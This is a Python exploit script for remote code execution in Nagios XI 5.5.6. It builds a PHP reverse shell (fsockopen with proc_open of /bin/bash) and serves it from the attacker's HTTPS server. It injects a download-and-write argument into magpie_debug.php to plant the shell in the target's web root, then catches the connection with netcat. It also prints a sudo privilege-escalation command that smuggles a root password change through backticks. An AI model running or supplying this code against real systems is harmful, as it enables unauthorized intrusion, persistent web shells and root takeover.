#!/usr/bin/python3
# Exploit Title: Nagios-XI 5.5.6 RCE
# Exploit Author: (m4ud)

import http.server
import ssl
import sys
import requests
import threading
import time
import subprocess
from optparse import OptionParser
from OpenSSL import crypto, SSL


def get_cert(
    emailAddress="m4ud@pentest.com",
    commonName="m4ud",
    countryName="CA",
    localityName="m4ud",
    stateOrProvinceName="m4ud",
    organizationName="m4ud",
    organizationUnitName="m4ud",
    serialNumber=0,
    validityStartInSeconds=0,
    validityEndInSeconds=10*365*24*60*60,
    KEY_FILE = "key.key",
    CERT_FILE="cert.crt"):
    #can look at generated file using openssl:
    #openssl x509 -inform pem -in selfsigned.crt -noout -text
    # create a key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 4096)
    # create a self-signed cert
    cert = crypto.X509()
    cert.get_subject().C = countryName
    cert.get_subject().ST = stateOrProvinceName
    cert.get_subject().L = localityName
    cert.get_subject().O = organizationName
    cert.get_subject().OU = organizationUnitName
    cert.get_subject().CN = commonName
    cert.get_subject().emailAddress = emailAddress
    cert.set_serial_number(serialNumber)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(validityEndInSeconds)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha512')
    with open(CERT_FILE, "wt") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
    with open(KEY_FILE, "wt") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))


def wshell(shell):
  f = open( 'shelb.php', 'w' )
  f.write(shell)
  f.close()
  print("\r\n (m4ud) brings you Nagios XI pwnage!")
  print("\r\n[+] Initiating Omega Protocol [+]")

def serverShutdown(server):
    server.stop()
    print("[+] Shutting down Web-Server![+]")
    print("[*] Check sudo -l for presence of autodiscover_new.php, if present, privesc!")
    print("\r\n[*] Possible Privesc: sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses='127.0.0.1/1`echo root:pass |chpasswd`'\r\n")
    print("[*] Ooh boy, here it comes the Shell! [*]\r\n")


class burn():
  def __init__(self, options):
    get_cert()
    self.target = options.target
    self.lhost = options.lhost 
    self.lport = options.lport 
    self.wport = options.wport 
    self.url = "http://" + self.target
    url = self.url
    self.exPath = "/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url="
    self.payload = "https://" + self.lhost + ":"+  str(self.wport) +"/shelb.php%20-o%20/usr/local/nagvis/share/shelb.php"
    shell = """<?php $sock=fsockopen(""" +'"' + self.lhost  + '"'+  "," + self.lport + """);$proc=proc_open(""" + '"'+"/bin/bash -i"+'"' + """, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"""
    wshell(shell)
    server_address = (self.lhost, int(self.wport))
    print("[+] Serving Payload at port " + str(self.wport) +" [+]")
    self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    self.httpd.socket = ssl.wrap_socket(self.httpd.socket,
                                   server_side=True,
                                   certfile="cert.crt",
                                   keyfile="key.key",
                                   ssl_version=ssl.PROTOCOL_TLS)
    self.server_thread = threading.Thread(target=self.httpd.serve_forever)

  def get_url(self):
    r = requests.get(self.url + self.exPath + self.payload)

  def shell(self):
    tpath = "http://" + self.target + "/nagvis/shelb.php"
    server_address = (self.lhost, int(self.wport))
    f = subprocess.Popen(["nc", "-lvnp", self.lport])
    r2 = requests.get(tpath)
    f.communicate()


  def start(self):
    self.server_thread.start()

  def stop(self):
    self.httpd.shutdown()
    self.httpd.server_close()

def main():
  parser = OptionParser() 
  parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address") 
  parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT") 
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST") 
  parser.add_option("-w","--wport", dest="wport",default=4443, help="WebServer Port")

  (options, args) = parser.parse_args() 

  if options.target:
    server = burn(options) 
    server.start()
    for i in range(1):
        t = threading.Thread(target=server.get_url())
        t.daemon = True
        t2 = threading.Thread(target=serverShutdown, args=(server,))
        t2.daemon = True
        t2.start()
        server.shell()
#        t3 = threading.Thread(target=server.shell())
#        t3.start()

  else:
    print("(m4ud) Magnificent NagiosXI RCE, use -h for help!!!")
if __name__=="__main__":
  main()

